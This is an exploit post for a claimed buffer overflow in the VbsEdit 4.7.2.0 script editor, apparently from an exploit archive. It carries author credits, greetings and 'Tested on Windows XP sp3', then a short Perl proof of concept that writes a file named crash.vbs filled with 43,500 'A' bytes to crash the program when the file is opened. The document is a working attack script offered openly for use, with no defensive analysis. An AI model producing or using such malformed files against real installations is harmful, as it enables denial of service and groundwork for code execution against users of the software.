#Title: VbsEdit v 4.7.2.0(.vbs) Buffer Overflow Vulnerability
#Author    :   anT!-Tr0J4n
#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
#Greetz    :   Dev-PoinT.com ; GlaDiatOr,SILVER STAR , HoBeeZ, Coffin Of Evil
#special thanks    :   r0073r,Sid3^effects,L0rd CruSad3r,SeeMe,Sonic,gunslinger_,Sn!pEr.S!Te,n4pst3rr,indoushka, KnocKout,SONiC,ZoRLu
#Home     :   www.Dev-PoinT.com  $ http://inj3ct0r.com
#Software :  http://www.vbsedit.com
#Tested on:   Windows XP sp3
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
#!/usr/bin/perl
print "| Author: anT!-Tr0J4n      |\n";
print "| Greetz :http://inj3ct0r.com     |\n";
print "|Home : www.Dev-PoinT.com  |\n";
 
my $junk= "\x41" x 43500 ;
open(file,">crash.vbs");
print file $junk ;
close(file);